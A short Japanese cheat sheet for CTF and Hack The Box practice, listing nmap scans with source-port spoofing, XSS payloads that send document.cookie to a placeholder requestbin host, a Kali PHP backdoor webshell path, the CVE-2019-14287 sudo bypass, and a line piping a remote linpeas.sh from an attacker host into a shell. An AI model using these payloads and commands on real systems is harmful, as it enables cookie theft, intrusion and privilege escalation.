# Memo
### ctfとかhtbとか  

#### nmap

```sudo nmap -sS -p- IP```  
全ポートのスキャン(時間はかかる)  

```nmap -sV -A -p 21-25,35,43,69,80-88,107-110,115,118,123,137-139,143,156,161-162,220,384,389,443-445,465,514,530,543-544,591,593,636,901-903,953,992,995,1025,1433-1434,1812,3000,3306,3389,3535,5000,5432,7777,8008,8080,8443,8888 IP```  
> -sV -A  

でバージョン情報とかを得るようになる(指定しているポートは可能性のありそうなポート)  

```nmap -sV -A -g 53 -p 21-25,35,43,69,80-88,107-110,115,118,123,137-139,143,156,161-162,220,384,389,443-445,465,514,530,543-544,591,593,636,901-903,953,992,995,1025,1433-1434,1812,3000,3306,3389,3535,5000,5432,7777,8008,8080,8443,8888 IP```  
> -g 53  

で送信元ポートを53(DNS)に偽装する  

<br>  

#### XSS  
```'';!--"<XSS>=&{()}```  
> 上を入力して表記が崩れたらXSSいけるかも  
> 参考 https://jpcertcc.github.io/OWASPdocuments/CheatSheets/XSSFilterEvasion.html#XSS_Locator  

```<script>fetch('https://requestbin.example.com?data=${document.cookie}')</script>```  
> 上のはCookieをrequestbin.example.com(例なので存在しない)に送信するスクリプト  
> 上のrequestbin.example.comに対応するものは例えばhttps://requestbin.com/  

```<script src="data:,document.location='https://requestbin.example.com?data='+document.cookie"></script>```  
> こっちも有り  

<br>  

#### webshell   
```/usr/share/webshells/php/simple-backdoor.php```
> Kaliにはwebshellも用意されている  

<br>  

#### 権限昇格関連  

```ps aux```  
> 実行中のプロセスを表示  

```sudo -u#-1 whoami```  
> CVE-2019-14287  

```attacker:~/enum$ sudo python -m SimpleHTTPServer 80```  
```victim$ curl attackerIP/linpeas.sh | sh```  
> attacker:~/enumフォルダには  
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite  
https://github.com/diego-treitos/linux-smart-enumeration  
https://github.com/rebootuser/LinEnum  
などのEnumツールが入ってると仮定  
上の例ではlinpeas.shを指定している



<br>  

#### スタック時のアドバイス  
・キーワードになりそうなもの(些細なものでも)を一旦メモか何かにまとめる．  
